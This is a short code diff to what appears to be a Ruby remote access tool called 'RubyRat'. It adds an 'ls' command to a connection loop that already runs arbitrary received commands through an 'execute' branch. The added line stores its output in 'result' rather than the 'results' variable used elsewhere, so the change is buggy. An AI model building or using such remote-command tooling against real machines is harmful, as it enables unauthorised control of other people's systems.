@@ -66,7 +66,10 @@ def client_loop(conn)
       results = RubyRat::Tools.ifconfig(@platform)
     when 'execute'
       results = RubyRat::Tools.execute(data.gsub('execute ', ''))
+    when 'ls'
+      result = RubyRat::Tools.ls
     end
+
     # TODO add more stuff
     #end
     results << "\n#{cmd} completed."
